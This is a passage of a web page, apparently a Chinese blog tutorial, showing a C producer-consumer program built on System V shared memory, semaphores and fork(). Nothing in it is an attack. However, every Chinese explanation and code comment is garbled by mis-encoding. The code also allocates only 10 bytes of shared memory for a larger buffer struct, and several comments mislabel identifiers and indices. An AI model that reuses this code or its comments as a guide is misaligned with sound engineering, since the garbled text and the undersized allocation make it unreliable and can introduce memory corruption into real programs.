</h4><p>åœ¨mainå‡½æ•°ä¸­ï¼Œé¦–å…ˆåˆå§‹åŒ–ä¿¡å·é‡ï¼ˆmutexè¡¨ç¤ºç¼“å†²åŒºçš„äº’æ–¥è®¿é—®ï¼Œè®¾ä¸º1ï¼›SEM_FULLè¡¨ç¤ºç¼“å†²åŒºæ»¡çš„æ•°é‡ï¼Œè®¾ä¸º0ï¼›SEM_EMPTYè¡¨ç¤ºç¼“å†²åŒºç©ºçš„æ•°é‡ï¼Œè®¾ä¸º10ï¼‰ï¼Œåˆ†é…å…±äº«å†…å­˜ï¼Œåˆå§‹åŒ–ç¼“å†²åŒºï¼Œåˆ›å»ºç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…ï¼Œé‡Šæ”¾å†…å­˜å†é€€å‡ºã€‚</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_BUFFER_SIZE 10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SHM_MODE 0600</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_MODE 0600</span><br><span class="hljs-comment">//ä¿¡å·é›†åˆå†…çš„æ¯ä¸ªä¿¡å·é‡çš„ç´¢å¼•,</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_FULL 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_EMPTY 1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MUTEX 2</span><br><span class="hljs-comment">//ç¼“å†²åŒºç»“æ„</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> out;<br><span class="hljs-keyword">int</span> in;<br><span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br><span class="hljs-keyword">int</span> num; <span class="hljs-comment">//ç¼“å†²åŒºé‡Œå­—æ¯æ•°é‡</span><br><span class="hljs-keyword">int</span> is_empty;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_CONSUMER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//æ¶ˆè´¹è€…æ•°é‡</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_PRODUCER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//ç”Ÿäº§è€…æ•°é‡</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_BUFFER = <span class="hljs-number">10</span>;   <span class="hljs-comment">//ç¼“å†²åŒºå®¹é‡</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//å·¥ä½œæ¬¡æ•°</span><br><span class="hljs-comment">//ä¿¡å·é‡id</span><br><span class="hljs-keyword">int</span> shm_id = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">//å…±äº«å†…å­˜id</span><br><span class="hljs-keyword">int</span> sem_id = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">//å­è¿›ç¨‹çš„id</span><br><span class="hljs-keyword">pid_t</span> consumer_id;<br><span class="hljs-keyword">pid_t</span> producer_id;<br><span class="hljs-comment">//å¾—åˆ°10ä»¥å†…çš„ä¸€ä¸ªéšæœºæ•°</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> digit;<br>digit = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">3</span>;<br><span class="hljs-keyword">return</span> digit;<br>&#125;<br><br><span class="hljs-comment">//å¾—åˆ°Aï½Zçš„ä¸€ä¸ªéšæœºå­—æ¯</span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">getRandChar</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> letter;<br>letter = (<span class="hljs-keyword">char</span>)((<span class="hljs-built_in">rand</span>() % <span class="hljs-number">26</span>) + <span class="hljs-string">&#x27;A&#x27;</span>);<br><span class="hljs-keyword">return</span> letter;<br>&#125;<br><br><span class="hljs-comment">//sem_id è¡¨ç¤ºä¿¡å·é‡é›†åˆçš„ id</span><br><span class="hljs-comment">//sem_num è¡¨ç¤ºè¦å¤„ç†çš„ä¿¡å·é‡åœ¨ä¿¡å·é‡é›†åˆä¸­çš„ç´¢å¼•</span><br><span class="hljs-comment">//Pæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sb</span>;</span><br>sb.sem_num = sem_num;<br>sb.sem_op = <span class="hljs-number">-1</span>; <span class="hljs-comment">//è¡¨ç¤ºè¦æŠŠä¿¡å·é‡å‡ä¸€</span><br>sb.sem_flg = <span class="hljs-number">0</span>; <span class="hljs-comment">//</span><br><span class="hljs-comment">//ç¬¬äºŒä¸ªå‚æ•°æ˜¯ sembuf [] ç±»å‹çš„ï¼Œè¡¨ç¤ºæ•°ç»„</span><br><span class="hljs-comment">//ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤º ç¬¬äºŒä¸ªå‚æ•°ä»£è¡¨çš„æ•°ç»„çš„å¤§å°</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semop</span>(sem_id, &amp;sb, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;waitSem failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//Væ“ä½œ</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">signalSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sb</span>;</span><br>sb.sem_num = sem_num;<br>sb.sem_op = <span class="hljs-number">1</span>;<br>sb.sem_flg = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//ç¬¬äºŒä¸ªå‚æ•°æ˜¯ sembuf [] ç±»å‹çš„ï¼Œè¡¨ç¤ºæ•°ç»„</span><br><span class="hljs-comment">//ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤º ç¬¬äºŒä¸ªå‚æ•°ä»£è¡¨çš„æ•°ç»„çš„å¤§å°</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semop</span>(sem_id, &amp;sb, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;signalSem failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//æ‰“å°è¿›ç¨‹è¿è¡Œæ—¶é—´</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//æ‰“å°æ—¶é—´</span><br><span class="hljs-keyword">time_t</span> now;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">timenow</span>;</span> <span class="hljs-comment">//å®ä¾‹åŒ–tmç»“æ„æŒ‡é’ˆ</span><br><span class="hljs-built_in">time</span>(&amp;now);<br>timenow = <span class="hljs-built_in">localtime</span>(&amp;now);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %02d:%02d:%02d   |  &quot;</span>, timenow-&gt;tm_hour, timenow-&gt;tm_min, timenow-&gt;tm_sec);<br>&#125;<br><span class="hljs-comment">//ç”Ÿäº§è€…è¿›ç¨‹çš„ç”Ÿäº§å’Œä¿¡æ¯æ‰“å°</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">produce_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//sleep(get_random()); //éšæœºç¡çœ ä¸€æ®µæ—¶é—´ï¼Œç›¸å½“äºäººä¸ºæ‰©å¤§è¿›ç¨‹æ‰§è¡Œæ“ä½œæ—¶é—´</span><br><span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//ç¨‹åºè¿è¡Œæ—¶é—´</span><br><span class="hljs-comment">//ç”Ÿäº§äº§å“</span><br><span class="hljs-keyword">char</span> c = <span class="hljs-built_in">getRandChar</span>(); <span class="hljs-comment">//éšæœºè·å–å­—æ¯</span><br>shmptr-&gt;str[shmptr-&gt;in] = c;<br>shmptr-&gt;in = (shmptr-&gt;in + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>shmptr-&gt;is_empty = <span class="hljs-number">0</span>; <span class="hljs-comment">//å†™å…¥æ–°äº§å“</span><br>shmptr-&gt;num++;<br><span class="hljs-comment">//æ‰“å°ç¼“å†²åŒº</span><br><span class="hljs-keyword">int</span> p = (shmptr-&gt;in - <span class="hljs-number">1</span> &gt;= shmptr-&gt;out) ? (shmptr-&gt;in - <span class="hljs-number">1</span>) : (shmptr-&gt;in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br><span class="hljs-keyword">for</span> (p; !(shmptr-&gt;is_empty) &amp;&amp; p &gt;= shmptr-&gt;out; p--)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, shmptr-&gt;str[p % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - shmptr-&gt;num; j++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);  <span class="hljs-comment">//æ§åˆ¶è¾“å‡ºæ ¼å¼</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;producer_%d   |    &quot;</span>, i + <span class="hljs-number">1</span>); <span class="hljs-comment">//è¿›ç¨‹idä¿¡æ¯</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;+ %c    |\n&quot;</span>, c); <span class="hljs-comment">//è¿›ç¨‹æ“ä½œ</span><br><span class="hljs-built_in">fflush</span>(stdout);<br>&#125;<br><span class="hljs-comment">//æ¶ˆè´¹è€…è¿›ç¨‹çš„æ¶ˆè´¹å’Œä¿¡æ¯æ‰“å°</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//sleep(get_random());</span><br><span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//ç¨‹åºè¿è¡Œæ—¶é—´</span><br><span class="hljs-comment">/*ç”Ÿäº§äº§å“*/</span><br><span class="hljs-keyword">char</span> lt = shmptr-&gt;str[shmptr-&gt;out];<br>shmptr-&gt;out = (shmptr-&gt;out + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>shmptr-&gt;is_empty = (shmptr-&gt;out == shmptr-&gt;in); <span class="hljs-comment">//</span><br>shmptr-&gt;num--;<br><span class="hljs-comment">//æ‰“å°ç¼“å†²åŒº</span><br><span class="hljs-keyword">int</span> p = (shmptr-&gt;in - <span class="hljs-number">1</span> &gt;= shmptr-&gt;out) ? (shmptr-&gt;in - <span class="hljs-number">1</span>) : (shmptr-&gt;in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br><span class="hljs-keyword">for</span> (p; !(shmptr-&gt;is_empty) &amp;&amp; p &gt;= shmptr-&gt;out; p--)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, shmptr-&gt;str[p % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - shmptr-&gt;num; j++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);  <span class="hljs-comment">//æ§åˆ¶è¾“å‡ºæ ¼å¼</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;consumer_%d   |    &quot;</span>, i + <span class="hljs-number">1</span>); <span class="hljs-comment">//è¿›ç¨‹idä¿¡æ¯</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- %c    |\n&quot;</span>, lt); <span class="hljs-comment">//è¿›ç¨‹æ“ä½œ</span><br><span class="hljs-built_in">fflush</span>(stdout);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">srand</span>((<span class="hljs-keyword">unsigned</span>)(<span class="hljs-built_in">getpid</span>() + <span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)));<br>shm_id = <span class="hljs-built_in">shmget</span>(IPC_PRIVATE, MAX_BUFFER_SIZE, SHM_MODE); <span class="hljs-comment">//ç”³è¯·å…±äº«å†…å­˜</span><br><span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;create shared memory failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span> *<span class="hljs-title">shmptr</span>;</span><br>shmptr = <span class="hljs-built_in">shmat</span>(shm_id, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//å°†ç”³è¯·çš„å…±äº«å†…å­˜é™„åŠ åˆ°ç”³è¯·é€šä¿¡çš„è¿›ç¨‹ç©ºé—´</span><br><span class="hljs-keyword">if</span> (shmptr == (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;add buffer to using process space failedï¼\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ((sem_id = <span class="hljs-built_in">semget</span>(IPC_PRIVATE, <span class="hljs-number">3</span>, SEM_MODE)) &lt; <span class="hljs-number">0</span>)<br>&#123; <span class="hljs-comment">//åˆ›å»ºä¸‰ä¸ªä¿¡å·é‡ï¼ŒSEM_EMPTY,SEM_FULLå’ŒMUTEX</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;create semaphore failed! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semctl</span>(sem_id, SEM_FULL, SETVAL, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>&#123; <span class="hljs-comment">//å°†ç´¢å¼•ä¸º0çš„ä¿¡å·é‡è®¾ç½®ä¸º0--&gt;SEM_FULL</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;sem set value error! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semctl</span>(sem_id, SEM_EMPTY, SETVAL, <span class="hljs-number">10</span>) == <span class="hljs-number">-1</span>)<br>&#123; <span class="hljs-comment">//å°†ç´¢å¼•ä¸º1çš„ä¿¡å·é‡è®¾ç½®ä¸º10--&gt;SEM_EMPTY</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;sem set value error! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semctl</span>(sem_id, MUTEX, SETVAL, <span class="hljs-number">1</span>) == <span class="hljs-number">-1</span>)<br>&#123; <span class="hljs-comment">//å°†ç´¢å¼•ä¸º3çš„ä¿¡å·é‡è®¾ç½®ä¸º1--&gt;MUTEX</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;sem set value error! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">//åˆå§‹åŒ–ç¼“å†²åŒº</span><br>shmptr-&gt;out = <span class="hljs-number">0</span>;<br>shmptr-&gt;in = <span class="hljs-number">0</span>;<br>shmptr-&gt;is_empty = <span class="hljs-number">1</span>;<br>shmptr-&gt;num = <span class="hljs-number">0</span>;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------Process Execution Table-----------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|     time     |  buffer data  |current  process| operation |\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N_PRODUCER; i++)<br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br>producer_id = fork();<br><br><span class="hljs-keyword">if</span> (producer_id &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;the fork failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (producer_id == <span class="hljs-number">0</span>) <span class="hljs-comment">//æ˜¯å­è¿›ç¨‹åˆ™æ‰§è¡Œç”Ÿäº§æ“ä½œ</span><br>&#123;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; N_WORKTIME; j++)<br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br><span class="hljs-built_in">waitSem</span>(sem_id, SEM_EMPTY);<br><span class="hljs-built_in">waitSem</span>(sem_id, MUTEX);<br><br><span class="hljs-built_in">produce_print</span>(i, shmptr);<br><br><span class="hljs-built_in">signalSem</span>(sem_id, MUTEX);<br><span class="hljs-built_in">signalSem</span>(sem_id, SEM_FULL);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N_CONSUMER; i++)<span class="hljs-comment">//</span><br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br>consumer_id = fork();<br><br><span class="hljs-keyword">if</span> (consumer_id &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//è°ƒç”¨forkå¤±è´¥</span><br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;the fork failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (consumer_id == <span class="hljs-number">0</span>) <span class="hljs-comment">//æ˜¯å­è¿›ç¨‹åˆ™æ‰§è¡Œæ¶ˆè´¹æ“ä½œ</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; N_WORKTIME; j++)<br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br><span class="hljs-built_in">waitSem</span>(sem_id, SEM_FULL);<br><span class="hljs-built_in">waitSem</span>(sem_id, MUTEX);<br><br><span class="hljs-built_in">consume_print</span>(i, shmptr);<br><br><span class="hljs-built_in">signalSem</span>(sem_id, MUTEX);<br><span class="hljs-built_in">signalSem</span>(sem_id, SEM_EMPTY);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//ä¸»è¿›ç¨‹æœ€åé€€å‡º</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">wait</span>(<span class="hljs-number">0</span>) != <span class="hljs-number">-1</span>)<br>;<br><span class="hljs-comment">//å°†å…±äº«æ®µä¸è¿›ç¨‹ä¹‹é—´è§£é™¤è¿æ¥</span><br><span class="hljs-built_in">shmdt</span>(shmptr);<br><span class="hljs-comment">//å¯¹å…±äº«å†…å­˜åŒºæ‰§è¡Œæ§åˆ¶æ“ä½œ</span><br><span class="hljs-built_in">shmctl</span>(shm_id, IPC_RMID, <span class="hljs-number">0</span>); <span class="hljs-comment">//å½“cmdä¸ºIPC_RMIDæ—¶ï¼Œåˆ é™¤è¯¥å…±äº«æ®µ</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸»è¿›ç¨‹è¿è¡Œç»“æŸï¼\n&quot;</span>);<br><br><span class="hljs-built_in">fflush</span>(stdout);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"></a> 